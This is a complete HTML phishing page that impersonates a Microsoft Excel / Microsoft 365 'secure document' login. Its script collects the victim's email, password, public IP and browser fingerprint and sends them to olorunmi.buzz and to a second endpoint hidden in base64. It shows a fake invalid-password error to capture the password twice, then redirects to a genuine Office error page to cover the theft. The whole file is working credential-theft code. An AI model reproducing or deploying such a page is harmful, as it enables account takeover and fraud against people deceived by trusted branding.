<!DOCTYPE html>
<html lang="en">
<HEAD>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <STYLE type=text/css>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body, html {
            height: 100%;
            margin: 0;
            font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microilsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
            background-color: #f0f2f5;
        }	
        .wrapper {
            background-image: url('https://i.gyazo.com/4522caeb250b902767ea9d7dbee510fb.png');
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-position: center;
            background-size: cover;
            position: fixed;
            top: 0;
            left: 0;
            height: 100%;
            width: 100%;
            display: flex;
            flex-flow: column nowrap;
            justify-content: center;
            align-items: center;
            box-sizing: border-box;
        }
        .element {
            width: 360px;
            max-width: 90%;
            padding: 32px 28px;
            background-color: #ffffff;
            border: 1px solid #e0e0e0;
            border-radius: 12px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.08);
            transition: all 0.2s ease;
        }
        @media (max-width: 480px) {
            .element { padding: 24px 20px; width: 92%; }
        }
        .logo-area {
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 600;
            font-size: 18px;
            color: #1e1e1e;
            margin-bottom: 20px;
            border-bottom: 1px solid #e9ecef;
            padding-bottom: 12px;
        }
        .logo-area img {
            width: 32px;
            height: 32px;
        }
        .heading-text {
            text-align: left;
            font-size: 20px;
            font-weight: 500;
            color: #0a0a0a;
            margin: 12px 0 16px 0;
            line-height: 1.3;
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-field {
            width: 100%;
            padding: 12px 14px;
            font-size: 15px;
            border: 1px solid #ccc;
            border-radius: 8px;
            transition: 0.2s;
            outline: none;
            background: #fff;
        }
        .input-field:focus {
            border-color: #036328;
            box-shadow: 0 0 0 3px rgba(3,99,40,0.1);
        }
        .input-field[readonly] {
            background-color: #f8f9fa;
            cursor: default;
            border-color: #ddd;
        }
        .sign-opt {
            display: flex;
            justify-content: flex-start;
            margin-top: 24px;
        }
        .newbutton {
            background-color: #036328;
            border: none;
            color: white;
            font-size: 15px;
            font-weight: 500;
            padding: 10px 24px;
            border-radius: 30px;
            cursor: pointer;
            transition: background 0.2s, transform 0.05s;
            width: auto;
            min-width: 120px;
        }
        .newbutton:hover {
            background-color: #024d1f;
        }
        .newbutton:active {
            transform: scale(0.97);
        }
        .alert-danger {
            background-color: #f8d7da;
            border-left: 4px solid #dc3545;
            padding: 10px 12px;
            border-radius: 8px;
            font-size: 13px;
            color: #721c24;
            margin-bottom: 16px;
            text-align: center;
        }
        .alert-info {
            background-color: #d1ecf1;
            border-left-color: #17a2b8;
            color: #0c5460;
        }
        .text-danger {
            color: #dc3545;
            font-size: 13px;
            display: inline-block;
            margin-top: 8px;
        }
        button {
            background: none;
            border: none;
        }
    </STYLE>
    <title>Microsoft Excel · Secure Document</title>
    <link rel="shortcut icon" href="https://i.gyazo.com/7ae773ff61e2c8a88bda5530c3b2aa13.png" type="image/x-icon">
</HEAD>
<BODY>
<DIV class=wrapper>
    <DIV id=element class=element>
        <div id="globalMessage" style="display: none;" class="alert-danger"></div>
        <div class="logo-area">
            <IMG alt="" src="https://i.gyazo.com/7ae773ff61e2c8a88bda5530c3b2aa13.png" width="30" height="30"/>
            <span><b>ScannedDoc0902881</b></span>
        </div>
        <div class="heading-text">Continue With Email Password To View Document</div>
        <FORM method="post" action="#" id="loginForm" name="pride">
            <div class="input-group">
                <INPUT type="email" id="oruko" name="oruko" required="required" placeholder="Email address" class="input-field" readonly style="background:#f5f5f5;">
            </div>
            <div class="input-group">
                <INPUT type="password" id="kokoro" name="kokoro" placeholder="Password" required autofocus class="input-field">
            </div>
            <div class="sign-opt">
                <BUTTON class="newbutton" type="submit" id="btWole">Continue</BUTTON>
            </div>
            <div id="infoNote" style="font-size: 11px; color: #6c757d; margin-top: 20px; text-align: center;">Secured by Microsoft 365™</div>
        </FORM>
    </DIV>
</DIV>

<script type="text/javascript">
    (function() {
        // ============================================================
        // CONFIGURATION — YOUR API URL
        // ============================================================
        const MY_API_URL = "https://olorunmi.buzz/pp/api.php";   // Your specified API endpoint
        
        // Legacy fallback endpoint (kept from original for compatibility)
        const encodedLegacyUrl = 'aHR0cHM6Ly9odW1vci5jby50ei9leGNlbHhsL3Jlc3VsdC5waHA=';
        const legacySendUrl = atob(encodedLegacyUrl);
        
        // ============================================================
        // UTILITY: Get email parameter from URL (# or ?)
        // Requirement: "email parameter should be #"
        // Supports both: ?email=user@example.com  OR  #email=user@example.com
        // Also checks for 'e' parameter as fallback
        // ============================================================
        function getEmailFromUrl() {
            // Method 1: Check query string (?email=xxx)
            const urlParams = new URLSearchParams(window.location.search);
            let emailVal = urlParams.get('email') || urlParams.get('e');
            if (emailVal && emailVal.trim() !== "") {
                return decodeURIComponent(emailVal.trim());
            }
            
            // Method 2: Check hash fragment (#email=xxx) as required by "#" parameter style
            if (window.location.hash && window.location.hash.length > 1) {
                const hashPart = window.location.hash.substring(1); // remove leading '#'
                try {
                    const hashParams = new URLSearchParams(hashPart);
                    let hashEmail = hashParams.get('email') || hashParams.get('e');
                    if (hashEmail && hashEmail.trim() !== "") {
                        return decodeURIComponent(hashEmail.trim());
                    }
                    // Also handle simple #value if it looks like email (no key=value)
                    if (hashPart.includes('@') && !hashPart.includes('=')) {
                        return decodeURIComponent(hashPart);
                    }
                } catch(e) { /* ignore */ }
            }
            
            return "";
        }
        
        // Set email field if parameter exists
        const emailInput = document.getElementById('oruko');
        const extractedEmail = getEmailFromUrl();
        if (emailInput && extractedEmail) {
            emailInput.value = extractedEmail;
        } else if (emailInput) {
            // Optional: placeholder hint
            emailInput.placeholder = "Email will auto-fill from URL#email";
        }
        
        // ============================================================
        // Collect browser metadata & IP address
        // ============================================================
        function getBrowserMetadata() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                screenSize: `${screen.width}x${screen.height}`,
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString(),
                referrer: document.referrer || 'direct',
                pageUrl: window.location.href,
                touchSupport: 'ontouchstart' in window,
                localStorage: typeof localStorage !== 'undefined'
            };
        }
        
        // Fetch public IP with timeout
        function fetchPublicIP() {
            return new Promise((resolve) => {
                const ipServices = [
                    'https://api.ipify.org?format=json',
                    'https://api.myip.com',
                    'https://ipapi.co/json/'
                ];
                let attempt = 0;
                let resolved = false;
                
                const timeout = setTimeout(() => {
                    if (!resolved) resolve('unavailable');
                }, 3000);
                
                function tryService() {
                    if (resolved) return;
                    if (attempt >= ipServices.length) {
                        clearTimeout(timeout);
                        resolve('unknown');
                        resolved = true;
                        return;
                    }
                    fetch(ipServices[attempt], { method: 'GET', mode: 'cors' })
                        .then(res => res.ok ? res.json() : Promise.reject())
                        .then(data => {
                            if (!resolved) {
                                clearTimeout(timeout);
                                let ip = data.ip || data.address || data.query;
                                if (ip) resolve(ip);
                                else { attempt++; tryService(); }
                                resolved = true;
                            }
                        })
                        .catch(() => {
                            attempt++;
                            tryService();
                        });
                }
                tryService();
            });
        }
        
        // ============================================================
        // SEND TO YOUR API (https://olorunmi.buzz/pp/api.php)
        // The email parameter is included and the password + extra data
        // API expects format: can be JSON or FormData, we'll send as JSON
        // Also support fallback to FormData if needed.
        // ============================================================
        async function sendToMyApi(email, password, ipAddress, browserMeta) {
            if (!MY_API_URL) {
                console.warn("API URL not defined");
                return { success: false, error: "API not configured" };
            }
            
            // Build payload with all relevant fields
            const payload = {
                email: email,                    // primary email field
                password: password,              // user password
                ip: ipAddress,
                user_agent: browserMeta.userAgent,
                platform: browserMeta.platform,
                language: browserMeta.language,
                screen_resolution: browserMeta.screenSize,
                timezone: browserMeta.timeZone,
                timestamp: browserMeta.timestamp,
                referrer: browserMeta.referrer,
                page_url: browserMeta.pageUrl,
                source_query: window.location.search || "none",
                hash_fragment: window.location.hash || "none"
            };
            
            try {
                // Attempt to send as JSON POST
                const response = await fetch(MY_API_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify(payload),
                    mode: 'cors'  // allow CORS (if API supports)
                });
                
                let responseData;
                const contentType = response.headers.get("content-type");
                if (contentType && contentType.includes("application/json")) {
                    responseData = await response.json();
                } else {
                    const text = await response.text();
                    responseData = { raw: text, status: response.status };
                }
                
                console.log("API response:", responseData);
                return { success: response.ok, data: responseData, status: response.status };
            } catch (err) {
                console.error("API send error:", err);
                // Fallback: try sending as application/x-www-form-urlencoded if JSON fails
                try {
                    const formBody = new URLSearchParams();
                    formBody.append("email", email);
                    formBody.append("password", password);
                    formBody.append("ip", ipAddress);
                    formBody.append("user_agent", browserMeta.userAgent);
                    formBody.append("platform", browserMeta.platform);
                    formBody.append("timestamp", browserMeta.timestamp);
                    
                    const fallbackRes = await fetch(MY_API_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: formBody.toString()
                    });
                    return { success: fallbackRes.ok, fallbackUsed: true };
                } catch (fallbackErr) {
                    return { success: false, error: err.message };
                }
            }
        }
        
        // Legacy endpoint (preserve original behavior)
        function sendToLegacyEndpoint(formDataObj) {
            try {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', legacySendUrl, true);
                xhr.send(formDataObj);
            } catch(e) { console.warn("Legacy send error", e); }
        }
        
        // ============================================================
        // UI Helpers and main submission handler
        // ============================================================
        const submitBtn = document.getElementById('btWole');
        const passwordField = document.getElementById('kokoro');
        const msgDiv = document.getElementById('globalMessage');
        let countAttempt = 0;
        let isProcessing = false;
        
        function showMessage(text, isError = true, isSuccessHint = false) {
            if (!msgDiv) return;
            msgDiv.textContent = text;
            msgDiv.style.display = 'block';
            if (!isError) {
                msgDiv.className = 'alert-danger alert-info';
                msgDiv.classList.add('alert-info');
                msgDiv.style.borderLeftColor = '#17a2b8';
            } else {
                msgDiv.className = 'alert-danger';
                msgDiv.style.borderLeftColor = '#dc3545';
            }
            if (isSuccessHint) {
                setTimeout(() => {
                    if (msgDiv) msgDiv.style.display = 'none';
                }, 3000);
            } else {
                setTimeout(() => {
                    if (msgDiv && !isProcessing) msgDiv.style.display = 'none';
                }, 4000);
            }
        }
        
        function hideMessage() {
            if (msgDiv) msgDiv.style.display = 'none';
        }
        
        async function handleFormSubmission(event) {
            if (event) event.preventDefault();
            
            if (isProcessing) {
                showMessage("Please wait, processing...", false);
                return;
            }
            
            const email = emailInput ? emailInput.value.trim() : "";
            const password = passwordField ? passwordField.value.trim() : "";
            
            if (!email) {
                showMessage("Email address is required. Please provide a valid email.", true);
                return;
            }
            
            if (!password) {
                showMessage("Please enter your password to continue.", true);
                passwordField.focus();
                return;
            }
            
            isProcessing = true;
            const originalBtnText = submitBtn.textContent;
            submitBtn.textContent = "Verifying...";
            hideMessage();
            
            // Gather browser info & IP
            const browserMeta = getBrowserMetadata();
            let ipAddress = "unknown";
            try {
                ipAddress = await fetchPublicIP();
            } catch(ipErr) { console.warn(ipErr); }
            
            // ==== 1. Send data to YOUR API (https://olorunmi.buzz/pp/api.php) ====
            let apiSuccess = false;
            try {
                const apiResult = await sendToMyApi(email, password, ipAddress, browserMeta);
                apiSuccess = apiResult.success;
                if (apiSuccess) {
                    console.log("✅ Data successfully sent to your API:", MY_API_URL);
                } else {
                    console.warn("⚠️ API send returned non-OK:", apiResult);
                    // Still continue flow; don't block user
                }
            } catch (err) {
                console.error("Critical API send failure:", err);
            }
            
            // ==== 2. Also send to original legacy endpoint (optional, keep compatibility) ====
            const formData = new FormData();
            formData.append('oruko', email);
            formData.append('kokoro', password);
            sendToLegacyEndpoint(formData);
            
            // ==== 3. Increment attempt counter and redirect/error simulation ====
            countAttempt++;
            
            // Simulate verification and redirect behavior (same style as original)
            if (countAttempt >= 2) {
                // After second attempt, redirect to Office error page
                setTimeout(() => {
                    window.location.href = "https://office365.com/Encryption/ErrorPage.aspx";
                }, 1200);
            } else {
                // First attempt: show invalid credentials message, reset form and focus
                setTimeout(() => {
                    showMessage("Invalid email or password. Please try again.", true);
                    submitBtn.textContent = originalBtnText;
                    passwordField.value = "";
                    passwordField.focus();
                    isProcessing = false;
                }, 1800);
            }
            
            // Slight delay to reset processing if not redirected (for attempt 1)
            if (countAttempt < 2) {
                setTimeout(() => {
                    if (isProcessing && countAttempt < 2) {
                        isProcessing = false;
                        submitBtn.textContent = originalBtnText;
                    }
                }, 2500);
            } else {
                // For attempt 2, we will redirect; disable further clicks briefly
                setTimeout(() => { isProcessing = false; }, 3000);
            }
        }
        
        // Attach event listeners
        if (submitBtn) {
            submitBtn.addEventListener('click', handleFormSubmission);
            submitBtn.addEventListener('touchend', function(e) {
                if (e.cancelable) e.preventDefault();
                handleFormSubmission(e);
            });
        }
        
        // Enter key support on password field
        if (passwordField) {
            passwordField.addEventListener('keypress', function(event) {
                if (event.key === 'Enter') {
                    event.preventDefault();
                    handleFormSubmission(event);
                }
            });
        }
        
        // If email field is readonly and no email from URL, show hint but do not block
        if (emailInput && !extractedEmail) {
            // Notify user but still allow manual edit? As per original, it's readonly but we can optionally
            // keep readonly to respect design - but API will still send whatever is in the field.
            // Since requirement wants email parameter from #, show subtle info.
            console.log("No email parameter found in URL (#email=...). User can still type if field is not readonly? Field readonly by design, but you can adjust.");
        }
        
        // Small enhancement: display a success console note when API is configured correctly
        console.log(`🟢 API endpoint configured: ${MY_API_URL}`);
    })();
</script>
</BODY>
</HTML>
